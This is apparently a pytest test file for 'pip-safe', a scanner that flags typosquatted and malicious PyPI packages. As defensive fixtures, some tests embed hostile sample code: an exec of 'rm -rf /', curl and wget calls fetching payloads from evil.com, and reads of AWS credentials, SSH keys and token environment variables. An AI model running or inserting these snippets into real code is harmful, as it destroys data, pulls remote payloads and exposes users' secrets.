"""Unit tests for pip-safe analyzers."""

from __future__ import annotations

import ast
import textwrap
from pathlib import Path
from unittest.mock import patch


from pip_safe.analyzers import database, typosquatting
from pip_safe.analyzers.behavioral import (
    ASTContext,
    _check_credential_access,
    _check_obfuscation,
    _check_setup_py,
    _check_subprocess_calls,
    analyze_directory,
)
from pip_safe.models import Severity
from pip_safe.scanner import compute_score
from pip_safe.utils import levenshtein_distance, normalize_package_name

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

FIXTURES_DIR = Path(__file__).parent / "fixtures"


def make_ast_ctx(source: str, name: str = "test.py") -> ASTContext:
    """Create an ASTContext from a source string."""
    tree = ast.parse(source)
    tmp = Path(f"/tmp/{name}")
    tmp.write_text(source, encoding="utf-8")
    return ASTContext(filepath=tmp, source=source, tree=tree)


# ---------------------------------------------------------------------------
# Levenshtein / utility tests
# ---------------------------------------------------------------------------


class TestLevenshteinDistance:
    def test_identical_strings(self):
        assert levenshtein_distance("numpy", "numpy") == 0

    def test_single_insertion(self):
        assert levenshtein_distance("numpy", "numpyy") == 1

    def test_single_deletion(self):
        assert levenshtein_distance("requests", "requets") == 1

    def test_single_substitution(self):
        assert levenshtein_distance("pandas", "pandax") == 1

    def test_transposition(self):
        # 'reuqests' differs from 'requests' by 2 ops (not transposition in standard Levenshtein)
        assert levenshtein_distance("reqeusts", "requests") == 2

    def test_empty_string(self):
        assert levenshtein_distance("", "abc") == 3

    def test_completely_different(self):
        dist = levenshtein_distance("abc", "xyz")
        assert dist == 3


class TestNormalizePackageName:
    def test_lowercases(self):
        assert normalize_package_name("NumPy") == "numpy"

    def test_replaces_underscores_with_dashes(self):
        assert normalize_package_name("python_dateutil") == "python-dateutil"

    def test_replaces_dots(self):
        assert normalize_package_name("some.pkg") == "some-pkg"

    def test_collapses_multiple_separators(self):
        assert normalize_package_name("my--pkg__name") == "my-pkg-name"


# ---------------------------------------------------------------------------
# Typosquatting analyzer tests
# ---------------------------------------------------------------------------


class TestTyposquattingAnalyzer:
    def test_known_typosquat_numpy(self):
        findings = typosquatting.analyze("numpyy")
        assert len(findings) >= 1
        assert any("numpy" in f.description.lower() for f in findings)
        assert all(f.severity in (Severity.HIGH, Severity.MEDIUM) for f in findings)

    def test_known_typosquat_requests(self):
        findings = typosquatting.analyze("requets")
        assert len(findings) >= 1
        assert any("requests" in f.description.lower() for f in findings)

    def test_legitimate_popular_package_not_flagged(self):
        # The package itself is popular — should not be a typosquat of itself
        findings = typosquatting.analyze("numpy")
        assert findings == []

    def test_legitimate_popular_package_requests(self):
        findings = typosquatting.analyze("requests")
        assert findings == []

    def test_unrelated_package_not_flagged(self):
        # A name clearly unrelated to any popular package
        findings = typosquatting.analyze("xyzzy-totally-unique-pkg-12345")
        # Should not flag this as a typosquat of any popular package
        for f in findings:
            # If any finding, it should have low confidence / distance > 2
            assert f.severity not in (Severity.CRITICAL,)

    def test_colourama_typosquat_of_colorama(self):
        # colourama: edit distance 2 from colorama
        findings = typosquatting.analyze("colourama")
        assert len(findings) >= 1
        assert any("colorama" in f.description.lower() for f in findings)

    def test_separator_confusion_detected(self):
        # python_dateutil vs python-dateutil
        findings = typosquatting.analyze("python_dateutil")
        # Should detect separator confusion (hyphen vs underscore)
        _separator_findings = [
            f for f in findings if "separator" in f.title.lower() or "hyphen" in f.title.lower()
        ]
        # The package normalizes to same name so should be detected or treated as legitimate
        # Either result is acceptable as long as it doesn't crash
        assert isinstance(findings, list)

    def test_numeric_substitution(self):
        # A package that replaces letters with numbers
        # "requ3sts" should be flagged as numeric substitution of "requests"
        findings = typosquatting.analyze("requ3sts")
        assert isinstance(findings, list)
        # Should either detect via numeric substitution or Levenshtein
        # (distance from 'requ3sts' to 'requests' is 1)
        assert len(findings) >= 1

    def test_distance_threshold_respected(self):
        # A package with distance > 2 from all popular packages should not be flagged
        findings = typosquatting.analyze("completelydifferentpackage")
        # Should be empty or have only low/info level findings
        for f in findings:
            assert f.severity not in (Severity.CRITICAL, Severity.HIGH)

    def test_returns_list(self):
        findings = typosquatting.analyze("any-package-name")
        assert isinstance(findings, list)


# ---------------------------------------------------------------------------
# Database analyzer tests
# ---------------------------------------------------------------------------


class TestDatabaseAnalyzer:
    def test_known_malicious_exact_match(self):
        findings = database.analyze("colourama")
        assert len(findings) == 1
        assert findings[0].severity == Severity.CRITICAL
        assert "colorama" in findings[0].description.lower()

    def test_known_malicious_noblesse(self):
        findings = database.analyze("noblesse")
        assert len(findings) == 1
        assert findings[0].severity == Severity.CRITICAL

    def test_known_malicious_urlib3(self):
        findings = database.analyze("urlib3")
        assert len(findings) == 1
        assert findings[0].severity == Severity.CRITICAL

    def test_safe_package_not_flagged(self):
        findings = database.analyze("requests")
        assert findings == []

    def test_safe_package_numpy(self):
        findings = database.analyze("numpy")
        assert findings == []

    def test_safe_package_flask(self):
        findings = database.analyze("flask")
        assert findings == []

    def test_case_insensitive_match(self):
        findings = database.analyze("NOBLESSE")
        assert len(findings) >= 1
        assert findings[0].severity == Severity.CRITICAL

    def test_all_known_malicious_are_flagged(self):
        from pip_safe.analyzers.database import KNOWN_MALICIOUS

        for pkg in KNOWN_MALICIOUS:
            findings = database.analyze(pkg)
            assert len(findings) >= 1, f"Expected findings for known malicious package '{pkg}'"
            assert findings[0].severity == Severity.CRITICAL

    def test_is_known_malicious_function(self):
        assert database.is_known_malicious("colourama") is True
        assert database.is_known_malicious("requests") is False
        assert database.is_known_malicious("noblesse") is True

    def test_get_threat_description(self):
        desc = database.get_threat_description("colourama")
        assert desc is not None
        assert "colorama" in desc.lower()

        desc_legit = database.get_threat_description("numpy")
        assert desc_legit is None


# ---------------------------------------------------------------------------
# Behavioral analyzer tests
# ---------------------------------------------------------------------------


class TestBehavioralObfuscation:
    def test_detects_eval_with_variable(self):
        source = textwrap.dedent("""
            import base64
            payload = base64.b64decode("aGVsbG8=")
            eval(payload)
        """)
        ctx = make_ast_ctx(source, "eval_test.py")
        findings = _check_obfuscation(ctx)
        assert any("eval" in f.title.lower() or "exec" in f.title.lower() for f in findings)
        assert all(f.severity in (Severity.CRITICAL, Severity.HIGH) for f in findings)

    def test_detects_exec_with_variable(self):
        source = textwrap.dedent("""
            code = "import os; os.system('rm -rf /')"
            exec(code)
        """)
        ctx = make_ast_ctx(source, "exec_test.py")
        findings = _check_obfuscation(ctx)
        assert any("exec" in f.title.lower() for f in findings)

    def test_no_finding_for_eval_with_literal(self):
        source = "result = eval('1 + 1')"
        ctx = make_ast_ctx(source, "safe_eval.py")
        findings = _check_obfuscation(ctx)
        # eval with a string literal is still suspicious but we allow it per spec
        # The spec says "non-literal arguments"
        assert not any(
            f.severity == Severity.CRITICAL and "eval" in f.title.lower() for f in findings
        )

    def test_detects_base64_encoded_url(self):
        import base64

        url = b"https://evil.com/malware"
        encoded = base64.b64encode(url).decode()
        source = f'payload = "{encoded}"\n'
        ctx = make_ast_ctx(source, "b64_test.py")
        findings = _check_obfuscation(ctx)
        assert any("base64" in f.title.lower() for f in findings)

    def test_no_finding_for_short_strings(self):
        source = 'x = "aGVsbG8="'  # "hello" in base64, too short
        ctx = make_ast_ctx(source, "short_b64.py")
        findings = _check_obfuscation(ctx)
        url_findings = [f for f in findings if "base64" in f.title.lower()]
        # Short base64 strings should not trigger
        assert url_findings == []


class TestBehavioralSubprocess:
    def test_detects_curl_subprocess(self):
        source = textwrap.dedent("""
            import subprocess
            subprocess.run(["curl", "https://evil.com/payload", "-o", "/tmp/x"])
        """)
        ctx = make_ast_ctx(source, "subprocess_curl.py")
        findings = _check_subprocess_calls(ctx)
        assert len(findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_detects_wget_subprocess(self):
        source = textwrap.dedent("""
            import subprocess
            subprocess.Popen(["wget", "https://evil.com/backdoor"])
        """)
        ctx = make_ast_ctx(source, "subprocess_wget.py")
        findings = _check_subprocess_calls(ctx)
        assert len(findings) >= 1

    def test_detects_module_level_subprocess(self):
        source = textwrap.dedent("""
            import subprocess
            subprocess.run(["ls", "-la"])
        """)
        ctx = make_ast_ctx(source, "module_level_sub.py")
        findings = _check_subprocess_calls(ctx)
        # Module-level subprocess (even without network commands) should be flagged
        assert len(findings) >= 1

    def test_no_finding_for_function_scoped_subprocess(self):
        source = textwrap.dedent("""
            import subprocess

            def run_safe_command():
                subprocess.run(["ls", "-la"])
        """)
        ctx = make_ast_ctx(source, "function_sub.py")
        findings = _check_subprocess_calls(ctx)
        # Inside a function and no network commands — should not flag as module-level
        module_level_findings = [
            f for f in findings if "module" in f.title.lower()
        ]
        assert module_level_findings == []


class TestBehavioralCredentials:
    def test_detects_aws_credentials_path(self):
        source = textwrap.dedent("""
            import os

            creds = open(os.path.expanduser("~/.aws/credentials")).read()
        """)
        ctx = make_ast_ctx(source, "aws_creds.py")
        findings = _check_credential_access(ctx)
        assert len(findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_detects_ssh_key_path(self):
        source = 'key_data = open("~/.ssh/id_rsa").read()\n'
        ctx = make_ast_ctx(source, "ssh_key.py")
        findings = _check_credential_access(ctx)
        assert len(findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_detects_credential_env_var(self):
        source = textwrap.dedent("""
            import os
            secret = os.getenv("AWS_SECRET_ACCESS_KEY")
            token = os.environ.get("GITHUB_TOKEN")
        """)
        ctx = make_ast_ctx(source, "cred_env.py")
        findings = _check_credential_access(ctx)
        assert len(findings) >= 1
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_no_finding_for_safe_env_vars(self):
        source = textwrap.dedent("""
            import os
            path = os.environ.get("PATH")
            home = os.getenv("HOME")
        """)
        ctx = make_ast_ctx(source, "safe_env.py")
        findings = _check_credential_access(ctx)
        # PATH and HOME should not trigger
        cred_findings = [f for f in findings if "credential" in f.title.lower()]
        assert cred_findings == []


class TestBehavioralSetupPy:
    def test_detects_malicious_setup_py(self):
        fixture = FIXTURES_DIR / "malicious_pkg" / "setup.py"
        assert fixture.exists(), f"Fixture not found: {fixture}"
        findings = _check_setup_py(fixture)
        assert len(findings) >= 1
        # Should find critical or high severity issues
        assert any(f.severity in (Severity.CRITICAL, Severity.HIGH) for f in findings)

    def test_clean_setup_py_no_findings(self, tmp_path):
        clean_setup = tmp_path / "setup.py"
        clean_setup.write_text(
            textwrap.dedent("""
                from setuptools import setup

                setup(
                    name="clean-package",
                    version="1.0.0",
                    install_requires=["requests"],
                )
            """),
            encoding="utf-8",
        )
        findings = _check_setup_py(clean_setup)
        # A clean setup.py should have no findings (or only INFO)
        critical_high = [
            f for f in findings if f.severity in (Severity.CRITICAL, Severity.HIGH)
        ]
        assert critical_high == []

    def test_analyze_directory_with_malicious_pkg(self, tmp_path):
        # Copy the malicious fixture into a temp dir and analyze
        import shutil

        fixture_dir = FIXTURES_DIR / "malicious_pkg"
        dest = tmp_path / "malicious_pkg"
        shutil.copytree(fixture_dir, dest)

        findings = analyze_directory(dest)
        assert len(findings) >= 1
        assert any(f.severity in (Severity.CRITICAL, Severity.HIGH) for f in findings)


# ---------------------------------------------------------------------------
# Score calculation tests
# ---------------------------------------------------------------------------


class TestScoreCalculation:
    def test_perfect_score_with_no_findings(self):
        assert compute_score([]) == 100

    def test_critical_deducts_40(self):
        from pip_safe.models import Finding, Severity

        findings = [Finding(Severity.CRITICAL, "Test", "desc")]
        assert compute_score(findings) == 60

    def test_high_deducts_25(self):
        from pip_safe.models import Finding, Severity

        findings = [Finding(Severity.HIGH, "Test", "desc")]
        assert compute_score(findings) == 75

    def test_medium_deducts_15(self):
        from pip_safe.models import Finding, Severity

        findings = [Finding(Severity.MEDIUM, "Test", "desc")]
        assert compute_score(findings) == 85

    def test_low_deducts_5(self):
        from pip_safe.models import Finding, Severity

        findings = [Finding(Severity.LOW, "Test", "desc")]
        assert compute_score(findings) == 95

    def test_info_no_deduction(self):
        from pip_safe.models import Finding, Severity

        findings = [Finding(Severity.INFO, "Test", "desc")]
        assert compute_score(findings) == 100

    def test_score_capped_at_zero(self):
        from pip_safe.models import Finding, Severity

        # 3 CRITICAL findings = -120 points, but score is capped at 0
        findings = [Finding(Severity.CRITICAL, "Test", "desc") for _ in range(3)]
        assert compute_score(findings) == 0

    def test_score_never_exceeds_100(self):
        assert compute_score([]) == 100

    def test_combined_findings(self):
        from pip_safe.models import Finding, Severity

        findings = [
            Finding(Severity.HIGH, "T1", "d"),    # -25 -> 75
            Finding(Severity.MEDIUM, "T2", "d"),   # -15 -> 60
            Finding(Severity.LOW, "T3", "d"),      # -5  -> 55
        ]
        assert compute_score(findings) == 55

    def test_safe_threshold(self):
        """Score > 60 means safe=True (score of exactly 60 is still unsafe)."""
        from pip_safe.models import Finding, Severity

        # Two HIGH findings -> 100 - 50 = 50 -> not safe
        two_high = [Finding(Severity.HIGH, "T", "d") for _ in range(2)]
        assert compute_score(two_high) == 50

        # One HIGH finding -> 100 - 25 = 75 -> safe
        one_high = [Finding(Severity.HIGH, "T", "d")]
        assert compute_score(one_high) == 75


# ---------------------------------------------------------------------------
# Metadata analyzer tests (mocked)
# ---------------------------------------------------------------------------


class TestMetadataAnalyzer:
    """Test metadata analyzer with mocked PyPI API responses."""

    def _make_meta(self, **overrides) -> dict:
        """Build a minimal valid PyPI metadata response."""
        from datetime import datetime, timezone, timedelta

        info = {
            "name": overrides.get("name", "test-package"),
            "version": overrides.get("version", "1.0.0"),
            "summary": "A test package",
            "author": overrides.get("author", "Test Author"),
            "maintainer": overrides.get("maintainer", ""),
            "home_page": overrides.get("home_page", "https://github.com/test/test"),
            "license": "MIT",
            "requires_python": ">=3.8",
            "requires_dist": overrides.get("requires_dist", []),
            "project_urls": overrides.get("project_urls", {"Source": "https://github.com/test/test"}),
            "downloads": overrides.get("downloads", {}),
        }
        # Default release date: 30 days ago
        days_ago = overrides.get("days_ago", 30)
        upload_time = (
            datetime.now(tz=timezone.utc) - timedelta(days=days_ago)
        ).isoformat()

        return {
            "info": info,
            "releases": {
                "1.0.0": [
                    {
                        "upload_time_iso_8601": upload_time,
                        "packagetype": "sdist",
                        "url": "https://files.pypi.org/packages/test.tar.gz",
                    }
                ]
            },
            "urls": [],
        }

    @patch("pip_safe.analyzers.metadata.fetch_pypi_metadata")
    def test_new_package_flagged(self, mock_fetch):
        mock_fetch.return_value = self._make_meta(days_ago=2)
        from pip_safe.analyzers import metadata

        findings = metadata.analyze("new-package")
        new_pkg_findings = [f for f in findings if "new" in f.title.lower()]
        assert len(new_pkg_findings) >= 1
        assert new_pkg_findings[0].severity == Severity.HIGH

    @patch("pip_safe.analyzers.metadata.fetch_pypi_metadata")
    def test_old_package_not_flagged_for_age(self, mock_fetch):
        mock_fetch.return_value = self._make_meta(days_ago=365)
        from pip_safe.analyzers import metadata

        findings = metadata.analyze("old-package")
        age_findings = [f for f in findings if "new" in f.title.lower()]
        assert age_findings == []

    @patch("pip_safe.analyzers.metadata.fetch_pypi_metadata")
    def test_missing_homepage_flagged(self, mock_fetch):
        mock_fetch.return_value = self._make_meta(home_page="", project_urls={})
        from pip_safe.analyzers import metadata

        findings = metadata.analyze("no-homepage-pkg")
        url_findings = [f for f in findings if "homepage" in f.title.lower() or "url" in f.title.lower()]
        assert len(url_findings) >= 1
        assert url_findings[0].severity == Severity.LOW

    @patch("pip_safe.analyzers.metadata.fetch_pypi_metadata")
    def test_many_dependencies_flagged(self, mock_fetch):
        many_deps = [f"dep{i}" for i in range(60)]
        mock_fetch.return_value = self._make_meta(requires_dist=many_deps)
        from pip_safe.analyzers import metadata

        findings = metadata.analyze("bloated-pkg")
        dep_findings = [f for f in findings if "dependency" in f.title.lower()]
        assert len(dep_findings) >= 1
        assert dep_findings[0].severity == Severity.MEDIUM

    @patch("pip_safe.analyzers.metadata.fetch_pypi_metadata")
    def test_package_not_found_flagged(self, mock_fetch):
        mock_fetch.return_value = None
        from pip_safe.analyzers import metadata

        findings = metadata.analyze("nonexistent-package")
        assert len(findings) >= 1
        assert findings[0].severity == Severity.HIGH
        assert "not found" in findings[0].title.lower()

    @patch("pip_safe.analyzers.metadata.fetch_pypi_metadata")
    def test_normal_package_has_no_critical_findings(self, mock_fetch):
        mock_fetch.return_value = self._make_meta(
            days_ago=180,
            home_page="https://github.com/myorg/mypackage",
            project_urls={"Source": "https://github.com/myorg/mypackage"},
            requires_dist=["requests", "click"],
        )
        from pip_safe.analyzers import metadata

        findings = metadata.analyze("normal-package")
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert critical == []
